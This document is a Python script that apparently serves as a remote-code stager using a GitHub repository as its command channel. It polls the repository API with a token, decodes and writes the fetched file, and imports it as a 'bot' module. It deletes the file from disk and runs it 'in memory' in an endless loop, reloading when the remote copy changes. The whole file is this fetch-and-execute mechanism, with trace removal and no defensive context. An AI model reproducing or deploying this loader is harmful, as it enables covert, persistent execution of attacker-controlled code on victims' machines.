import requests
import json
import base64
import importlib
import time
import os


username='<username>'
token='<token>'
repo='<repo>'


url='https://api.github.com/repos/<user>/<repo>/contents/<filename>'
filename='<filename.py>'
sleep_time=5
filename_sha=None
bot=None


def downloadFile(filename):
	global username,token,repo,url
	print('[!] Downloading '+filename)
	sha=None
	content=None
	headers={
		'Authorization': 'Bearer '+token
		}
	url=url.replace('<user>', username).replace('<repo>', repo).replace('<filename>', filename)
	res=requests.get(url, headers=headers).json()
	if 'sha' in res.keys() and 'content' in res.keys():
		sha=res['sha']
		base64_bytes=base64.b64decode(res['content'].encode('ascii'))
		content=base64_bytes.decode('ascii')
	else:
		print('[-] '+res['message'])
	return sha,content

def updateFile(filename,sha=None):
	updated=False
	new_sha,content=downloadFile(filename)
	if (not sha or sha!=new_sha) and (new_sha):
		file=open(filename,'w')
		file.write(content)
		file.close()
		updated=True
		print('[!] Updating '+filename)
	return updated,new_sha

def import_lib(filename,reload_lib=False,first_time=False):
	global bot
	if first_time:
		import bot
		os.remove(filename)
		return bot
	elif reload_lib:
		importlib.reload(bot)
		os.remove(filename)

def main():
	global filename,sleep_time,filename_sha,bot
	start,filename_sha=updateFile(filename)
	while not start:
		time.sleep(sleep_time)
		start,filename_sha=updateFile(filename)
	import_lib(filename,first_time=True)
	while 1:
		print('[!] Running '+filename+' in memory')
		bot.run()
		time.sleep(sleep_time)
		reload_lib,filename_sha=updateFile(filename,filename_sha)
		import_lib(filename,reload_lib)

main()